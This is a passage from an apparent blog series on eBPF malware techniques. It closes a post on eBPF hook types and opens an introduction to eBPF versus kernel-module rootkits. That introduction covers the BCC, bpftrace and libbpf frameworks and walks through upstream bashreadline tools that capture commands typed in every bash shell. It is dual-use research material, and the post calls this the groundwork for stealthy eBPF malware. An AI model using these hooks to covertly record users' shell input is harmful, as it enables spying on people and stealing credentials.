<p>One last interesting detail worth mentioning - Even though you’re using <em>BPF_UPROBE</em> and <em>BPF_URETPROBE</em> in your eBPF programs, under the hood these are simply aliases for <em>BPF_KPROBE</em> and <em>BPF_KRETPROBE</em>.</p>
<p>Here’s the exact snippet from bpf_tracing.h:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* BPF_UPROBE and BPF_URETPROBE are identical to BPF_KPROBE and BPF_KRETPROBE,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * but are named way less confusingly for SEC(&#34;uprobe&#34;) and SEC(&#34;uretprobe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * use cases.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BPF_UPROBE(name, args...)      BPF_KPROBE(name, ##args)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BPF_URETPROBE(name, args...)   BPF_KRETPROBE(name, ##args)
</span></span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Macro Aliases for <em>uprobe</em>/<em>uretprobe</em><br><br></span>
<p>As stated by the author in the comments, this is just to reduce confusion when writing/reviewing code.</p>
<h2 id="6-conclusion">6. Conclusion</h2>
<p>n this post, you’ve learned how to choose the right eBPF hook for your goals. Whether you&rsquo;re aiming to monitor or manipulate behavior, understanding the strengths of each hook type is essential.</p>
<p><em>Tracepoints</em> are stable, kernel-defined spots ideal for observing system calls and structured events — perfect for tasks like monitoring directory listings.</p>
<p><em>Kprobes</em> / <em>Kretprobes</em> let you hook any kernel function dynamically, even ones without tracepoints. They’re your go-to when you need to monitor internal kernel logic.</p>
<p><em>Fentry</em> / <em>Fexit</em> are modern, more efficient alternatives to kprobes. They offer lower overhead and a cleaner way to hook function entry and exit — if BTF data is available on your target system.</p>
<p><em>Uprobes</em> / <em>Uretprobes</em> let you hook user-space binaries and libraries, giving you visibility into application-level logic — think of it as tracing processes beyond the kernel, like reading user commands from Bash.</p>
<p>Mastering these hooks is the foundation for crafting reliable and stealthy eBPF-based malware or tools. In the next post, I will be sharing some stealth techniques exhibited by <a href="https://github.com/eeriedusk/nysm"><em>nysm</em></a>.</p>
]]></content>
        </item>
        
        <item>
            <title>eBPF Malware Techniques Part 1 - Introduction</title>
            <link>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-1-introduction/</link>
            <pubDate>Sat, 05 Apr 2025 09:20:03 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-1-introduction/</guid>
            <description>&lt;h2 id=&#34;1-background&#34;&gt;1. Background&lt;/h2&gt;
&lt;p&gt;As a cybersecurity researcher, understanding both traditional and modern methods of kernel-level code execution is crucial. Two prominent techniques you&amp;rsquo;ll encounter are LKM (Loadable Kernel Module) rootkits and eBPF-based applications.&lt;/p&gt;
&lt;p&gt;eBPF (extended Berkeley Packet Filter) is a Linux kernel technology that allows safe, user-defined code to run in kernel context. Originally intended for packet filtering, eBPF has evolved into a generic in-kernel virtual machine — enabling dynamic tracing, monitoring, networking, and even security enforcement.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-background">1. Background</h2>
<p>As a cybersecurity researcher, understanding both traditional and modern methods of kernel-level code execution is crucial. Two prominent techniques you&rsquo;ll encounter are LKM (Loadable Kernel Module) rootkits and eBPF-based applications.</p>
<p>eBPF (extended Berkeley Packet Filter) is a Linux kernel technology that allows safe, user-defined code to run in kernel context. Originally intended for packet filtering, eBPF has evolved into a generic in-kernel virtual machine — enabling dynamic tracing, monitoring, networking, and even security enforcement.</p>
<p>Unlike traditional rootkits that load kernel modules (LKMs), eBPF programs are loaded from user space and executed within a sandboxed, verified environment in the kernel.</p>
<h2 id="2-portability-why-ebpf-wins-over-lkms">2. Portability: Why eBPF Wins Over LKMs</h2>
<p>One of the biggest advantages of eBPF over LKM-based approaches is portability. Traditional rootkits written as LKMs often rely on specific internal kernel symbols and structures that vary between kernel versions, making them fragile and version-locked.</p>
<p>eBPF solves this through:</p>
<ul>
<li>
<p>CO-RE (Compile Once, Run Everywhere): With the help of BTF (BPF Type Format), an eBPF binary can automatically adapt to the target kernel&rsquo;s data structures at load time.</p>
</li>
<li>
<p>Stable Kernel Interfaces: eBPF relies on stable hooks like tracepoints, kprobes, and cgroups, avoiding the need to patch or hook private kernel symbols.</p>
</li>
<li>
<p>User-space Loaders: eBPF programs are loaded via syscalls (e.g., bpf()), removing the need for privileged LKM loading mechanisms like <code>insmod</code> or <code>modprobe</code>.</p>
</li>
</ul>
<h2 id="3-limitations-of-ebpf">3. Limitations of eBPF</h2>
<p>Despite its flexibility and growing popularity, eBPF is not a silver bullet for kernel-level control. It is tightly restricted by design:</p>
<ul>
<li>
<p>Instruction Limit: Modern Linux kernels (e.g., 5.8+) support a maximum of 1 million instructions per program, though earlier versions had a hard limit of just 4096. This constraint exists to prevent DoS conditions from long-running programs.</p>
</li>
<li>
<p>No Loops (until recently): Older kernels rejected any loops to avoid non-terminating programs. Newer kernels (5.3+) allow bounded loops — but they must pass static verification.</p>
</li>
<li>
<p>No Arbitrary Memory Access: You can’t just dereference random kernel pointers. All memory accesses must be checked or derived from known safe helpers.</p>
</li>
<li>
<p>Strict Verifier Checks: The eBPF verifier enforces constraints like:</p>
<ul>
<li>No null pointer dereferencing</li>
<li>Stack bounds checking</li>
<li>No uninitialized memory use</li>
<li>Guaranteed program termination</li>
</ul>
</li>
</ul>
<h2 id="4-frameworks">4. Frameworks</h2>
<p>When creating eBPF applications, there are 3 major frameworks to consider. Depending on your usage, you may prefer one over the other.
The table below summarizes the points to consider for eBPF development.</p>
<table>
  <thead>
      <tr>
          <th>Framework</th>
          <th>Language</th>
          <th>Kernel Requirement</th>
          <th>Package Needed</th>
          <th>Best For</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><em>BCC</em></td>
          <td>Python/C++</td>
          <td>≥ 4.1 (≥ 4.9 ideal)</td>
          <td><code>bcc</code>, <code>python3-bcc</code></td>
          <td>Quick development, scripting</td>
      </tr>
      <tr>
          <td><em>bpftrace</em></td>
          <td>Custom DSL</td>
          <td>≥ 4.9 (≥ 5.5 ideal)</td>
          <td><code>*bpftrace*</code></td>
          <td>One-liners, dynamic tracing</td>
      </tr>
      <tr>
          <td>libbpf</td>
          <td>C</td>
          <td>≥ 4.18 (BTF needed)</td>
          <td><code>libbpf-dev</code>, Clang, LLVM</td>
          <td>Performance, production systems</td>
      </tr>
  </tbody>
</table>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="table">eBPF Frameworks<br><br></span>
<h3 id="41-bcc-bpf-compiler-collection">4.1 BCC (BPF Compiler Collection)</h3>
<p><a href="https://github.com/iovisor/BCC"><em>BCC</em></a> is a toolkit for creating efficient kernel tracing and manipulation programs, and includes several useful tools and examples. It makes use of eBPF, a new feature that was first added to Linux 3.15. Much of what <em>BCC</em> uses requires Linux 4.1 and above.</p>
<p><em>BCC</em> makes BPF programs easier to write, with kernel instrumentation in C (and includes a C wrapper around LLVM), and front-ends in Python and lua. It is suited for many tasks, including performance analysis and network traffic control.</p>
<p>To get started, we need to first get its dependencies.</p>
<p>In my case, I am using Ubuntu 24.04 and therefore, I will need the following packages:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># python3-pyelftools needed for following example</span>
</span></span><span style="display:flex;"><span>$ sudo apt install bpfcc-tools python3-bcc python3-pyelftools linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>BCC</em> Packages for Ubuntu<br><br></span>
However, if you are using another Linux distro, please refer to the official <a href="https://github.com/iovisor/bcc/blob/master/INSTALL.md">installation guide</a>. Once this step is done, we can test out many of the provided <a href="https://github.com/iovisor/bcc/tree/master/tools">tools</a> written by <a href="https://github.com/iovisor">iovisor</a> and many of its contributors.</p>
<p>I am simply going to choose <a href="https://github.com/iovisor/bcc/tree/master/tools/bashreadline.py">bashreadline.py</a> as my example.</p>
<p>Looking at the code, it searches for the symbol <em>readline_internal_teardown()</em> in either <code>/bin/bash</code> or <code>/lib/libreadline.so</code>.
If the <code>--shared</code> option is not specified, then it defaults to /bin/bash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(
</span></span><span style="display:flex;"><span>        description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Print entered bash commands from all running shells&#34;</span>,
</span></span><span style="display:flex;"><span>        formatter_class<span style="color:#f92672">=</span>argparse<span style="color:#f92672">.</span>RawDescriptionHelpFormatter)
</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-s&#34;</span>, <span style="color:#e6db74">&#34;--shared&#34;</span>, nargs<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?&#34;</span>,
</span></span><span style="display:flex;"><span>        const<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/lib/libreadline.so&#34;</span>, type<span style="color:#f92672">=</span>str,
</span></span><span style="display:flex;"><span>        help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;specify the location of libreadline.so library.</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">              Default is /lib/libreadline.so&#34;</span>)
</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>shared <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>shared <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>BCC</em> Packages for Ubuntu<br><br></span>
<p>It then defines the main logic of the eBPF program in C as defined by <em>bpf_text</em>. This will act as the main logic to our eBPF program. This code simply gets the PID that calls on <em>readline_internal_teardown()</em>. If the process that triggers this is &ldquo;bash&rdquo;, then it will send the context data from kernel space to user space via the <a href="https://docs.kernel.org/userspace-api/perf_ring_buffer.html">perf</a> ring buffer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;uapi/linux/ptrace.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/sched.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">str_t</span> {
</span></span><span style="display:flex;"><span>    u32 pid;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">80</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">BPF_PERF_OUTPUT</span>(events);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">printret</span>(<span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">str_t</span> data  <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> comm[TASK_COMM_LEN] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">PT_REGS_RC</span>(ctx))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    data.pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_get_current_pid_tgid</span>() <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read_user</span>(<span style="color:#f92672">&amp;</span>data.str, <span style="color:#66d9ef">sizeof</span>(data.str), (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">PT_REGS_RC</span>(ctx));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_get_current_comm</span>(<span style="color:#f92672">&amp;</span>comm, <span style="color:#66d9ef">sizeof</span>(comm));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (comm[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">&amp;&amp;</span> comm[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&amp;&amp;</span> comm[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span> <span style="color:#f92672">&amp;&amp;</span> comm[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;h&#39;</span> <span style="color:#f92672">&amp;&amp;</span> comm[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ) {
</span></span><span style="display:flex;"><span>        events.<span style="color:#a6e22e">perf_submit</span>(ctx,<span style="color:#f92672">&amp;</span>data,<span style="color:#66d9ef">sizeof</span>(data));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Definition of <em>bpf_text</em><br><br></span>
<p>Lastly, it uses <em>uretprobe</em> to hook onto the return of <em>readline_internal_teardown()</em> function. It also points the logic of our eBPF program to the <em>printret()</em> function defined in <em>bpf_text</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> BPF(text<span style="color:#f92672">=</span>bpf_text)
</span></span><span style="display:flex;"><span>b<span style="color:#f92672">.</span>attach_uretprobe(name<span style="color:#f92672">=</span>name, sym<span style="color:#f92672">=</span>sym, fn_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;printret&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching to <em>printret()</em> with <em>uretprobe</em><br><br></span>
<p>Alright, enough babbling. Let&rsquo;s see this in action.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo python3 bashreadline.py
</span></span></code></pre></div><video width=100% controls>
    <source src="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-1-introduction/videos/bcc-bashreadline.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video"><em>BCC</em> Demo - bashreadline.py<br><br></span>
<h3 id="42-bptrace">4.2 bptrace</h3>
<p><em>bpftrace</em> is a high-level tracing language for Linux. <em>bpftrace</em> uses LLVM as a backend to compile scripts to <a href="https://ebpf.io/what-is-ebpf/">eBPF</a>-bytecode and makes use of <a href="https://github.com/libbpf/libbpf">libbpf</a> and <a href="https://github.com/iovisor/bcc"><em>BCC</em></a> for interacting with the Linux BPF subsystem, as well as existing Linux tracing capabilities: kernel dynamic tracing (kprobes), user-level dynamic tracing (uprobes), tracepoints, etc. The <em>bpftrace</em> language is inspired by awk, C, and predecessor tracers such as DTrace and SystemTap. <em>bpftrace</em> was created by <a href="https://github.com/ajor">Alastair Robertson</a>.</p>
<p>There are several ways to install <em>bpftrace</em>. Depending on your Linux distro, you may want to refer to the <a href="https://github.com/*bpftrace*/*bpftrace*/blob/master/INSTALL.md">installation guide</a>.</p>
<p>In my case, I will install <em>bpftrace</em> with <em>apt</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt-get install bpftrace
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Installing <em>bpftrace</em> on Ubuntu<br><br></span>
<p>Alternatively, you may also get a statically compiled <em>bpftrace</em> via the <a href="https://github.com/bpftrace/bpftrace/releases/latest/download/*bpftrace*">latest release</a>.</p>
<p>To use this tool properly, we can either supply it with a one-liner program or a file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># One-Liner Usage</span>
</span></span><span style="display:flex;"><span>$ bpftrace <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> -e <span style="color:#e6db74">&#39;program&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example</span>
</span></span><span style="display:flex;"><span>$ bpftrace -e <span style="color:#e6db74">&#39;tracepoint:syscalls:sys_enter_openat { printf(&#34;%s %s\n&#34;, comm, str(args-&gt;filename)); }&#39;</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftrace</em> One-Liner Usage<br><br></span>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># File Usage</span>
</span></span><span style="display:flex;"><span>$ bpftrace <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> filename.bt
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example</span>
</span></span><span style="display:flex;"><span>$ bpftrace bashreadline.bt
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftrace</em> File Usage<br><br></span>
<p>Relating back to the previous example where we used <em>BCC</em> to read the user&rsquo;s bash terminal inputs, we can also do so with <em>bpfrace</em>!
Using the <a href="https://github.com/bpftrace/bpftrace/blob/master/tools/bashreadline.bt">bashreadline.bt</a> example provided by the bpftrace repository, we can achieve the same results as before.</p>
<p>However, let&rsquo;s take a look at what the code is doing first.
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert note">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Note</strong>
        </div>
        <div class="alert-body"><ul>
<li>After this <a href="https://github.com/iovisor/bpftrace/pull/1971">pull request</a>, bpftrace now supports automatic resolution of library paths and you no longer need to provide absolute or relative paths.</li>
</ul>
</div>
    </div>
</div>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>uretprobe:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash:readline,
</span></span><span style="display:flex;"><span>uretprobe:libreadline:readline
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>comm <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">time</span>(<span style="color:#e6db74">&#34;%H:%M:%S  &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%-6d %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid, <span style="color:#a6e22e">str</span>(retval));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Snippet of bashreadline.bt<br><br></span>
<p>The above snippet shows that it uses <em>uretprobe</em> to attach to the return of the <em>readline()</em> function in both <code>/bin/bash</code> and <code>libreadline.so.*</code>. It then prints the time, PID and the input command if the process name is &ldquo;bash&rdquo;.</p>
<p>This is almost exactly the same implementation as <em>BCC</em> bashreadline.py. Let&rsquo;s test this out and see it for ourselves!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftrace bashreadline.bt
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Running <em>bpftrace</em> with bashreadline.bt<br><br></span>
<video width=100% controls>
    <source src="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-1-introduction/videos/bpftrace-bashreadline.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video"><em>bpftrace</em> Demo - bashreadline.bt<br><br></span>
<h3 id="43-libbpf">4.3 libbpf</h3>
<p>Libbpf supports building eBPF CO-RE(Compile Once, Run Everywhere)-enabled applications, which, in contrast to BCC, do not require Clang/LLVM runtime being deployed to target servers and doesn&rsquo;t rely on kernel-devel headers being available.</p>
<p>It does rely on kernel to be built with BTF type information, though. Some major Linux distributions come with kernel BTF already built in:</p>
<ul>
<li>Fedora 31+</li>
<li>RHEL 8.2+</li>
<li>OpenSUSE Tumbleweed (in the next release, as of 2020-06-04)</li>
<li>Arch Linux (from kernel 5.7.1.arch1-1)</li>
<li>Manjaro (from kernel 5.4 if compiled after 2021-06-18)</li>
<li>Ubuntu 20.10</li>
<li>Debian 11 (amd64/arm64)</li>
</ul>
<p>You can check if your kernel has BTF built-in by looking for <code>/sys/kernel/btf/vmlinux</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -la /sys/kernel/btf/vmlinux
</span></span><span style="display:flex;"><span>-r--r--r--. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3541561</span> Jun  <span style="color:#ae81ff">2</span> 18:16 /sys/kernel/btf/vmlinux
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Checking if built-in BTF file exists<br><br></span>
<p>If you are running on an older kernel version and absolutely want to run a CO-RE eBPF application on your system, you can override the BTF file path by with the <code>BTF_FILE</code> bash environment variable. You may retrieve the appropriate BTF file from the <a href="https://github.com/aquasecurity/btfhub-archive">BTF Archive</a> by looking up your distro and kernel version.</p>
<p>The easiest way to get started with this framework is to leverage on the examples provided by <a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone --recurse-submodules https://github.com/libbpf/libbpf-bootstrap
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Getting libbpf-bootstrap Repository<br><br></span>
<p>For simplicity&rsquo;s sake (not because I&rsquo;m lazy 🤭), I am only going to go through the <em>minimal</em> example written in C.
When developing an eBPF application using <em>libbpf</em>, every application requires a <code>.c</code> and a corresponding <code>.bpf.c</code> file.</p>
<p>You can think of it as whatever we write in <code>.c</code> is in user-space while the rest of the logic in <code>.bpf.c</code> resides in kernel space.</p>
<p>Let&rsquo;s start by analyzing the user-space portion of our eBPF application starting from the headers.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;bpf/libbpf.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;minimal.skel.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Headers of minimal.c<br><br></span>
<p>Looking at the listing above, <code>libbpf.h</code> refers to the user-space API for interacting with the BPF syscall while <code>minimal.skel.h</code> is an auto-generated skeleton header from the eBPF program (minimal.bpf.c) when compiling with <code>make</code>. This simplifies the loading/attaching lifecycle.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Open BPF application */</span>
</span></span><span style="display:flex;"><span>skel <span style="color:#f92672">=</span> <span style="color:#a6e22e">minimal_bpf__open</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>skel) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Failed to open BPF skeleton</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Opening BPF Skeleton<br><br></span>
<p>Next the call to <em>minimal_bpf__open()</em> uses the BPF skeleton API, introduced in libbpf to simplify the boilerplate required for loading and managing BPF programs. When you compile your BPF program with bpftool gen skeleton, it creates a .skel.h file that wraps up all maps, programs, and sections into a single C interface.</p>
<p>Note that this call only prepares the skeleton in memory, maps out the BPF sections, but does not yet load or attach anything to the kernel.</p>
<p>Once the skeleton is opened, we can configure its memory-mapped <code>.bss</code> section — a region that is shared between the user-space process and the BPF program in the kernel.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* ensure BPF program only handles write() syscalls from our process */</span>
</span></span><span style="display:flex;"><span>skel<span style="color:#f92672">-&gt;</span>bss<span style="color:#f92672">-&gt;</span>my_pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpid</span>();
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Getting Self PID<br><br></span>
<p>In this case, we’re telling the BPF program:
“Only handle events related to my PID.”</p>
<p>This is a common trick to reduce noise and verifier complexity, especially in minimal test setups. The BPF code (not shown here) is expected to check my_pid and only act on syscall events if they come from this process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Once that is done, we will proceed to load our eBPF program.
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Load &amp; verify BPF programs */</span>
</span></span><span style="display:flex;"><span>err <span style="color:#f92672">=</span> <span style="color:#a6e22e">minimal_bpf__load</span>(skel);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (err) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Failed to load and verify BPF skeleton</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> cleanup;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Loading and Verifying eBPF Program<br><br></span>
<p>This is where the eBPF bytecode is actually injected into the kernel. libbpf invokes the bpf() syscall to:</p>
<ul>
<li>Load maps</li>
<li>Load programs</li>
<li>Run the verifier</li>
</ul>
